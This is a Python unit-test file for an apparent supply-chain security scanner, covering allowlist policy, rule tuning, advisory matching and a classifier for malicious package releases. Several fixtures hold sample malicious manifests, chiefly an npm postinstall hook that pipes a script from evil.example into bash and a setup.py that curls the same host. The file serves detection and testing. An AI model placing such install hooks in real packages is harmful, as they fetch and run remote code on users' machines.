import os
import json
import sys
import tempfile
import unittest
from io import StringIO
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from secopsai import supply_chain
from secopsai import cli as secopsai_cli


class SupplyChainTests(unittest.TestCase):
    def test_allowlist_add_and_remove_updates_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            added = supply_chain.allowlist_add("pypi", "textual", path=policy_path)
            removed = supply_chain.allowlist_remove("pypi", "textual", path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertTrue(added["changed"])
        self.assertTrue(removed["changed"])
        self.assertEqual(policy["allow"]["packages"], [])

    def test_tune_rule_and_threshold_update_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            supply_chain.tune_rule("manifest executable entrypoints", enabled=False, weight=1, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", value=12, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", package="langchain", value=14, path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertEqual(policy["rules"]["manifest executable entrypoints"], False)
        self.assertEqual(policy["rule_weights"]["manifest executable entrypoints"], 1)
        self.assertEqual(policy["ecosystem_thresholds"]["pypi"], 12)
        self.assertEqual(policy["package_thresholds"]["pypi:langchain"], 14)

    def test_cli_allowlist_add_and_tune_rule(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )
            old_env = os.environ.get("SECOPS_SUPPLY_CHAIN_POLICY")
            os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = str(policy_path)
            stdout = StringIO()
            try:
                with mock.patch("sys.stdout", stdout):
                    rc_add = secopsai_cli.main(
                        ["--json", "supply-chain", "allowlist", "add", "--ecosystem", "pypi", "--package", "textual"]
                    )
                add_output = stdout.getvalue()
                stdout.seek(0)
                stdout.truncate(0)
                with mock.patch("sys.stdout", stdout):
                    rc_tune = secopsai_cli.main(
                        ["--json", "supply-chain", "tune", "rule", "manifest executable entrypoints", "--disable", "--weight", "1"]
                    )
                tune_output = stdout.getvalue()
            finally:
                if old_env is None:
                    os.environ.pop("SECOPS_SUPPLY_CHAIN_POLICY", None)
                else:
                    os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = old_env

        self.assertEqual(rc_add, 0)
        self.assertEqual(rc_tune, 0)
        self.assertIn('"entry": "pypi:textual"', add_output)
        self.assertIn('"rule": "manifest executable entrypoints"', tune_output)

    def test_build_finding_uses_stable_identifier(self):
        result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious suspicious code path",
            report_path="/tmp/report.md",
            rank=12,
            finding_id=supply_chain._finding_id("pypi", "requests", "2.32.0"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["finding_id"], result.finding_id)
        self.assertEqual(finding["severity"], "critical")
        self.assertIn("requests@2.32.0", finding["title"])

    def test_load_recent_results_returns_most_recent_first(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            original = supply_chain.RESULTS_PATH
            supply_chain.RESULTS_PATH = Path(temp_dir) / "results.jsonl"
            try:
                first = supply_chain.ScanResult("pypi", "a", "1.0.0", "1.1.0", "benign", "", None, None, None)
                second = supply_chain.ScanResult("npm", "b", "2.0.0", "2.1.0", "malicious", "", None, None, "SCM-1")
                supply_chain._append_results([first, second])
                rows = supply_chain.load_recent_results(limit=2)
            finally:
                supply_chain.RESULTS_PATH = original

        self.assertEqual(rows[0]["package"], "b")
        self.assertEqual(rows[1]["package"], "a")

    def test_reconcile_history_cleans_stale_false_positive_state(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            original_results = supply_chain.RESULTS_PATH
            original_slack_state = supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH
            original_db_env = os.environ.get("SECOPS_FINDINGS_DIR")
            supply_chain.RESULTS_PATH = temp_path / "results.jsonl"
            supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = temp_path / "supply_chain_slack_state.json"
            os.environ["SECOPS_FINDINGS_DIR"] = str(temp_path / "findings")
            try:
                report_path = temp_path / "report.md"
                report_path.write_text("No strong compromise indicators found.\n", encoding="utf-8")
                row = {
                    "analysis": "Deterministic rules flagged: obfuscated eval",
                    "ecosystem": "npm",
                    "error": None,
                    "finding_id": "SCM-FP1",
                    "new_version": "1.2.3",
                    "old_version": "1.2.2",
                    "package": "example-clean",
                    "rank": 10,
                    "recorded_at": "2026-04-03T00:00:00Z",
                    "report_path": str(report_path),
                    "verdict": "malicious",
                }
                supply_chain._save_all_results([row])
                supply_chain.save_slack_state({"finding_ids": ["SCM-FP1"]}, supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                db_path = supply_chain.soc_store.default_db_path()
                supply_chain._upsert_findings([
                    {
                        "finding_id": "SCM-FP1",
                        "title": "Suspicious npm package release: example-clean@1.2.3",
                        "summary": "false positive",
                        "severity": "critical",
                        "severity_score": 90,
                        "status": "open",
                        "disposition": "unreviewed",
                        "first_seen": "2026-04-03T00:00:00Z",
                        "last_seen": "2026-04-03T00:00:00Z",
                        "event_ids": [],
                    }
                ])

                payload = supply_chain.reconcile_history()
                rows = supply_chain._load_all_results()
                state = supply_chain.load_slack_state(supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                finding = supply_chain.soc_store.get_finding("SCM-FP1", db_path)
            finally:
                supply_chain.RESULTS_PATH = original_results
                supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = original_slack_state
                if original_db_env is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = original_db_env

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "benign")
        self.assertEqual(state["finding_ids"], [])
        self.assertIsNone(finding)

    def test_run_scan_can_emit_slack_alert(self):
        fake_result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious",
            report_path="/tmp/report.md",
            rank=10,
            finding_id="SCM-TEST",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result), \
             mock.patch.object(supply_chain, "_append_results"), \
             mock.patch.object(supply_chain, "_upsert_findings", return_value="/tmp/test.db"), \
             mock.patch.object(supply_chain, "alert_new_supply_chain_findings", return_value={"new_findings": 1, "sent": True}) as alert_mock:
            payload = supply_chain.run_scan(
                ecosystem="pypi",
                package="requests",
                version="2.32.0",
                slack=True,
            )

        self.assertEqual(payload["slack_alerts_sent"], 1)
        alert_mock.assert_called_once()

    def test_classifier_flags_suspicious_npm_install_hook(self):
        report = """
## Artifact: npm-tarball

### `package.json`

```diff
+  "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
```
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("install hook", analysis)

    def test_classifier_flags_pypi_artifact_divergence(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=0
- suspicious_wheel_only_files:
  - `package/backdoor.py`
  - `package/native_payload.so`
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("artifact", analysis)

    def test_semantic_python_findings_detect_exec_and_network(self):
        source = """
import urllib.request
exec("print('x')")
urllib.request.urlopen("https://evil.example/payload")
"""
        findings = supply_chain._python_semantic_findings("payload.py", source)
        self.assertTrue(any("dynamic execution" in finding for finding in findings))
        self.assertTrue(any("outbound URL literal" in finding for finding in findings))

    def test_classifier_flags_semantic_findings_section(self):
        report = """
## Semantic Findings

- payload.py: python dynamic execution via exec()
- payload.py: python outbound URL literal https://evil.example/payload
- payload.py: python subprocess-capable call via subprocess.run()
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("semantic", analysis)

    def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
        source = """
{
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
  },
  "dependencies": {
    "left-pad": "https://evil.example/left-pad.tgz"
  },
  "bin": {
    "runner": "bin/runner.js"
  }
}
"""
        findings = supply_chain._package_json_policy_findings("package.json", source)
        self.assertTrue(any("lifecycle hook" in finding for finding in findings))
        self.assertTrue(any("non-registry source" in finding for finding in findings))
        self.assertTrue(any("bin" in finding for finding in findings))

    def test_setup_py_policy_findings_detect_cmdclass_and_exec(self):
        source = """
from setuptools import setup
import subprocess

setup(
    name="evilpkg",
    cmdclass={"install": object},
    entry_points={"console_scripts": ["evil=evil:main"]},
)

subprocess.run(["curl", "https://evil.example"])
"""
        findings = supply_chain._setup_py_policy_findings("setup.py", source)
        self.assertTrue(any("cmdclass" in finding for finding in findings))
        self.assertTrue(any("entrypoints" in finding or "entrypoints" in finding for finding in findings))
        self.assertTrue(any("execution or network-capable" in finding for finding in findings))

    def test_pyproject_policy_findings_detect_scripts_and_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "custom.backend"

[project]
dependencies = ["evilpkg @ https://evil.example/evilpkg.whl"]
scripts = { evil = "evil:main" }
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertTrue(any("console scripts" in finding for finding in findings))
        self.assertTrue(any("direct URL" in finding for finding in findings))
        self.assertTrue(any("custom build backend" in finding for finding in findings))

    def test_pyproject_policy_ignores_common_build_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "normalpkg"
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertFalse(any("custom build backend" in finding for finding in findings))

    def test_classifier_flags_manifest_policy_findings(self):
        report = """
## Semantic Findings

- package.json: npm lifecycle hook runs remote or inline code (postinstall)
- package.json: npm dependency uses non-registry source (left-pad)
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("manifest", analysis)

    def test_classifier_does_not_flag_outbound_url_alone(self):
        verdict, analysis = supply_chain._classify_report_text(
            """
```diff
+ https://docs.example/reference
```
"""
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("No strong compromise indicators", analysis)

    def test_classifier_does_not_flag_console_scripts_alone(self):
        report = """
## Semantic Findings

- pyproject.toml: pyproject declares console scripts
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_does_not_flag_unsuspicious_artifact_divergence_alone(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=1
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_changed_file_semantic_scan_uses_added_lines_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_path = Path(temp_dir) / "old.py"
            new_path = Path(temp_dir) / "new.py"
            old_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 1\n",
                encoding="utf-8",
            )
            new_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 2\n",
                encoding="utf-8",
            )
            findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
        self.assertEqual(findings, [])

    def test_artifact_divergence_ignores_src_layout_and_docs(self):
        artifact_reports = {
            "bdist_wheel": {
                "files_new": {
                    "pkg/__init__.py": Path("/tmp/pkg/__init__.py"),
                    "pkg/core.py": Path("/tmp/pkg/core.py"),
                }
            },
            "sdist": {
                "files_new": {
                    "src/pkg/__init__.py": Path("/tmp/src/pkg/__init__.py"),
                    "src/pkg/core.py": Path("/tmp/src/pkg/core.py"),
                    "docs/example.py": Path("/tmp/docs/example.py"),
                    "tests/test_pkg.py": Path("/tmp/tests/test_pkg.py"),
                }
            },
        }
        lines = supply_chain._summarize_artifact_mismatch(artifact_reports)
        self.assertEqual(lines, [])

    def test_policy_denylist_forces_malicious(self):
        policy = {
            "thresholds": {"malicious_score": 99},
            "allow": {"packages": []},
            "deny": {"packages": ["pypi:requests"]},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "No strong signals",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")
        self.assertIn("denylist", analysis)

    def test_policy_allowlist_forces_benign(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "https://evil.example eval exec",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("allowlist", analysis)

    def test_policy_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_package_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:sample": 1},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_rule_toggle_disables_signal(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": False},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_ecosystem_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {"pypi": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_rule_weight_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": True},
            "rule_weights": {"obfuscated eval": 5},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_explain_policy_reports_exact_package_threshold(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"pypi": 7},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:requests": 9},
            "rules": {"obfuscated eval": False},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_policy("pypi", "requests", policy=policy)
        self.assertEqual(payload["effective_threshold"], 9)
        self.assertEqual(payload["precedence"], ["package_threshold"])
        self.assertEqual(payload["matched_package_threshold"]["entry"], "pypi:requests")
        self.assertIn("obfuscated eval", payload["disabled_rules"])
        self.assertEqual(payload["rule_weight_overrides"]["obfuscated eval"], 5)

    def test_explain_policy_reports_wildcard_threshold_and_allowlist(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"npm": 8},
            "allow": {"packages": ["npm:@your-org/*"]},
            "deny": {"packages": []},
            "package_thresholds": {"npm:@your-org/*": 10},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_policy("npm", "@your-org/pkg", policy=policy)
        self.assertEqual(payload["effective_threshold"], 10)
        self.assertIn("npm:@your-org/*", payload["allow_matches"])
        self.assertEqual(payload["precedence"], ["allowlist"])

    def test_explain_verdict_reports_matched_rules_and_weights(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_verdict(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["score"], 5)
        self.assertEqual(payload["matched_rules"][0]["rule"], "obfuscated eval")
        self.assertEqual(payload["matched_rules"][0]["weight"], 5)

    def test_explain_verdict_reports_allowlist_context(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_verdict(
            "https://evil.example eval",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "benign")
        self.assertIn("allowlist", payload["analysis"])
        self.assertEqual(payload["allow_matches"], ["pypi:requests"])
        self.assertEqual(payload["policy"]["precedence"], ["allowlist"])

    def test_advisory_exact_version_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-1",
                "campaign_id": "unit-campaign",
                "title": "Unit advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/pkg", "versions": ["1.2.3"]}],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.check_advisory("npm", "@scope/pkg", "1.2.3")

        self.assertTrue(payload["matched"])
        self.assertEqual(payload["matches"][0]["advisory_id"], "ADV-1")

    def test_advisory_version_range_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RANGE",
                "title": "Range advisory",
                "status": "active",
                "affected": [{
                    "ecosystem": "pypi",
                    "package": "sample",
                    "version_ranges": [{"introduced": "2.0.0", "fixed": "2.0.5"}],
                }],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                matched = supply_chain.check_advisory("pypi", "sample", "2.0.3")
                not_matched = supply_chain.check_advisory("pypi", "sample", "2.0.5")

        self.assertTrue(matched["matched"])
        self.assertFalse(not_matched["matched"])

    def test_removed_artifact_with_advisory_creates_malicious_finding(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            findings_dir = temp_path / "findings"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-REMOVED",
                "title": "Removed artifact advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["9.9.9"]}],
                "detection_rationale": ["Registry artifact was removed after compromise."],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", temp_path / "results.jsonl"), \
                     mock.patch.object(supply_chain, "_npm_get_previous_version", return_value="9.9.8"), \
                     mock.patch.object(supply_chain, "_diff_package", return_value=(None, None)):
                    payload = supply_chain.run_scan(
                        ecosystem="npm",
                        package="@scope/removed",
                        version="9.9.9",
                        previous_version=None,
                    )
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        result = payload["result"]
        self.assertEqual(result["verdict"], "malicious")
        self.assertIn("advisory_matches", result)
        self.assertIn("advisory matched", result["error"])
        self.assertTrue(payload["db_path"].endswith("openclaw_soc.db"))

    def test_explain_verdict_includes_advisory_evidence(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-EXPLAIN",
                "title": "Explain advisory",
                "status": "active",
                "affected": [{"ecosystem": "pypi", "package": "guardrails-ai", "versions": ["0.10.1"]}],
                "iocs": {"file_paths": ["/tmp/transformers.pyz"]},
                "remediation": ["Remove version 0.10.1 and rotate exposed credentials."],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.explain_verdict(
                    "",
                    ecosystem="pypi",
                    package="guardrails-ai",
                    version="0.10.1",
                )

        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["advisory_matches"][0]["advisory_id"], "ADV-EXPLAIN")
        self.assertIn("emergency advisory match", [rule["rule"] for rule in payload["matched_rules"]])

    def test_reconcile_history_upgrades_advisory_error(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            advisory_dir = temp_path / "advisories"
            advisory_dir.mkdir()
            results_path = temp_path / "results.jsonl"
            findings_dir = temp_path / "findings"
            results_path.write_text(json.dumps({
                "ecosystem": "npm",
                "package": "@scope/removed",
                "old_version": "1.0.0",
                "new_version": "1.0.1",
                "verdict": "error",
                "analysis": "",
                "report_path": None,
                "rank": None,
                "finding_id": None,
                "error": "diff generation failed",
            }) + "\n", encoding="utf-8")
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-RECONCILE",
                "title": "Reconcile advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/removed", "versions": ["1.0.1"]}],
            }), encoding="utf-8")
            old_findings_dir = os.environ.get("SECOPS_FINDINGS_DIR")
            os.environ["SECOPS_FINDINGS_DIR"] = str(findings_dir)
            try:
                with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir), \
                     mock.patch.object(supply_chain, "RESULTS_PATH", results_path):
                    payload = supply_chain.reconcile_history(include_advisories=True)
                    rows = [json.loads(line) for line in results_path.read_text(encoding="utf-8").splitlines()]
            finally:
                if old_findings_dir is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = old_findings_dir

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "malicious")
        self.assertIn("ADV-RECONCILE", rows[0]["advisory_matches"][0]["advisory_id"])

    def test_cli_explain_verdict_resolves_stored_report(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            report_path = Path(temp_dir) / "report.md"
            report_path.write_text("eval\n", encoding="utf-8")
            results = [{
                "ecosystem": "pypi",
                "package": "requests",
                "new_version": "2.32.0",
                "report_path": str(report_path),
            }]
            stdout = StringIO()
            with mock.patch.object(secopsai_cli, "load_recent_results", return_value=results), \
                 mock.patch("sys.stdout", stdout):
                exit_code = secopsai_cli.main([
                    "--json",
                    "supply-chain",
                    "explain-verdict",
                    "--ecosystem",
                    "pypi",
                    "--package",
                    "requests",
                    "--version",
                    "2.32.0",
                ])

        self.assertEqual(exit_code, 0)
        output = stdout.getvalue()
        self.assertIn('"verdict": "benign"', output)
        self.assertIn('"report_path":', output)
        self.assertIn('"matched_rules"', output)


if __name__ == "__main__":
    unittest.main()
